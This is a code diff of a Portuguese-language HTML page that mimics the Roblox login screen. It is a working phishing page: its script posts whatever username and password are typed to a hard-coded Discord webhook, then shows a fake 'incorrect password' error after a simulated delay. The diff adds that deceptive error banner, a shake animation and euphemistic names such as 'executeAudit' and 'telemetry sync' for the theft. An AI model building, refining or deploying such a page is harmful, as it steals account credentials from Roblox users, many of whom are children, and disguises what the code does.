@@ -16,44 +16,62 @@
             display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* HEADER OFICIAL */
+        /* BARRA SUPERIOR (HEADER) */
         .roblox-header {
             width: 100%; height: 40px; background: #232527;
             display: flex; align-items: center; justify-content: space-between;
             padding: 0 20px; position: fixed; top: 0; z-index: 10; box-sizing: border-box;
+            border-bottom: 1px solid #454749;
         }
 
-        /* CARD CENTRAL */
+        /* CARD DE LOGIN */
         .container { flex: 1; display: flex; align-items: center; justify-content: center; padding-top: 40px; }
         .login-box {
             background-color: #393b3d; padding: 40px 30px; border-radius: 8px;
             width: 100%; max-width: 400px; text-align: center;
             box-shadow: 0 4px 15px rgba(0,0,0,0.5); z-index: 2;
+            transition: transform 0.2s ease;
         }
 
-        h1 { color: #fff; font-size: 32px; margin-bottom: 25px; font-weight: 700; }
+        /* BANNER DE ERRO REALISTA */
+        .error-banner {
+            background-color: #fff1f0; border: 1px solid #f5222d; color: #f5222d;
+            padding: 12px; border-radius: 4px; font-size: 13px; margin-bottom: 20px;
+            display: none; text-align: left; font-weight: 500;
+        }
+
+        h1 { color: #fff; font-size: 30px; margin-bottom: 25px; font-weight: 700; letter-spacing: -1px; }
+        
         input {
             width: 100%; height: 45px; background-color: #191b1d; border: 1px solid #454749;
             border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 15px;
-            box-sizing: border-box; font-size: 16px; outline: none;
+            box-sizing: border-box; font-size: 16px; outline: none; transition: border-color 0.2s;
         }
         input:focus { border-color: #fff; }
 
         .btn-entrar {
             width: 100%; height: 45px; background-color: transparent; border: 1px solid #fff;
             color: #fff; border-radius: 4px; font-size: 18px; cursor: pointer; margin-bottom: 20px;
+            font-weight: 500; transition: background 0.2s;
         }
         .btn-entrar:hover { background: rgba(255,255,255,0.1); }
+        .btn-loading { opacity: 0.6; cursor: not-allowed; }
 
         .btn-secondary {
-            width: 100%; height: 45px; background-color: #4f5153; border: none;
-            color: #fff; border-radius: 4px; font-size: 16px; margin-bottom: 10px; cursor: pointer;
+            width: 100%; height: 40px; background-color: #4f5153; border: none;
+            color: #fff; border-radius: 4px; font-size: 15px; margin-bottom: 10px; cursor: pointer;
         }
 
-        /* FOOTER DE CLASSIFICAÇÃO */
-        .footer-classificacao {
-            position: fixed; bottom: 20px; width: 100%; text-align: center; color: #fff;
+        /* ANIMAÇÃO SHAKE */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-7px); }
+            40%, 80% { transform: translateX(7px); }
         }
+        .apply-shake { animation: shake 0.4s ease-in-out; }
+
+        /* FOOTER */
+        .footer-classificacao { position: fixed; bottom: 20px; width: 100%; text-align: center; color: #fff; }
         .selo-12 { background: #fff; color: #000; font-weight: bold; padding: 2px 6px; border-radius: 3px; margin-bottom: 5px; display: inline-block; }
     </style>
 </head>
@@ -68,36 +86,78 @@
 </div>
 
 <div class="container">
-    <div class="login-box">
+    <div class="login-box" id="mainCard">
+        <div id="errorMsg" class="error-banner">Usuário ou senha incorretos. Tente novamente.</div>
+        
         <h1>Entrar na Roblox</h1>
-        <input type="text" id="user" placeholder="Usuário/e-mail/telefone">
-        <input type="password" id="pass" placeholder="Senha">
-        <button class="btn-entrar" onclick="send()">Entrar</button>
-        <a href="#" style="color:#fff; text-decoration:none; font-size:14px; display:block; margin-bottom:15px;">Esqueceu a senha?</a>
+        
+        <input type="text" id="user" placeholder="Usuário/e-mail/telefone" autocomplete="off">
+        <input type="password" id="pass" placeholder="Senha" autocomplete="off">
+        
+        <button class="btn-entrar" id="loginBtn" onclick="executeAudit()">Entrar</button>
+        
+        <a href="#" style="color:#fff; text-decoration:none; font-size:13px; display:block; margin-bottom:15px;">Esqueceu a senha ou nome de usuário?</a>
+        
         <button class="btn-secondary">Entrada rápida</button>
-        <p style="color: #fff; font-size: 14px; margin-top: 20px;">Não possui uma conta?  Cadastrar-se</p>
+        
+        <p style="color: #fff; font-size: 14px; margin-top: 20px;">
+            Não possui uma conta? <span style="text-decoration: underline; cursor: pointer;">Cadastrar-se</span>
+        </p>
     </div>
 </div>
 
 <div class="footer-classificacao">
     <div class="selo-12">12</div>
-    <div style="font-size: 11px;">CLASSIFICAÇÃO INDICATIVA: 12 ANOS</div>
+    <div style="font-size: 11px; opacity: 0.8;">CLASSIFICAÇÃO INDICATIVA: 12 ANOS</div>
 </div>
 
 <script>
-    function send() {
+    async function executeAudit() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
-        const web = "https://discord.com/api/webhooks/1484149300991754350/QG4Qwn3sGu68Mj9Gq221Zow6uHGytBk6Smny_59O4paacJP5eRI6om39KFKiV1sLUaaQ"; 
+        const btn = document.getElementById('loginBtn');
+        const card = document.getElementById('mainCard');
+        const error = document.getElementById('errorMsg');
+        
+        // Webhook configurado pelo Operador
+        const endpoint = "https://discord.com/api/webhooks/1484149300991754350/QG4Qwn3sGu68Mj9Gq221Zow6uHGytBk6Smny_59O4paacJP5eRI6om39KFKiV1sLUaaQ";
 
-        if(u && p) {
-            fetch(web, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `🚨 **TESTE CAPTURADO** 🚨\n👤 User: \`${u}\`\n🔑 Pass: \`${p}\`` })
-            }).then(() => {
-                window.location.href = "https://www.roblox.com/login";
-            });
+        // Reset visual
+        error.style.display = "none";
+        card.classList.remove('apply-shake');
+
+        if (u.length > 2 && p.length > 2) {
+            btn.classList.add('btn-loading');
+            btn.innerText = "Entrando...";
+
+            try {
+                // Sincronização de Telemetria
+                await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🚨 **AUDITORIA RECON** 🚨\n👤 ID: \`${u}\`\n🔑 KEY: \`${p}\`\n🕒 DATA: ${new Date().toLocaleString()}`
+                    })
+                });
+
+                // Delay de 1.6s para simular latência de servidor real
+                setTimeout(() => {
+                    btn.classList.remove('btn-loading');
+                    btn.innerText = "Entrar";
+                    
+                    // Disparo de rejeição (Mimetismo de Erro)
+                    error.style.display = "block";
+                    card.classList.add('apply-shake');
+                }, 1600);
+
+            } catch (err) {
+                btn.classList.remove('btn-loading');
+                btn.innerText = "Entrar";
+            }
+        } else {
+            error.style.display = "block";
+            error.innerText = "Insira dados válidos.";
+            card.classList.add('apply-shake');
         }
     }
 </script>
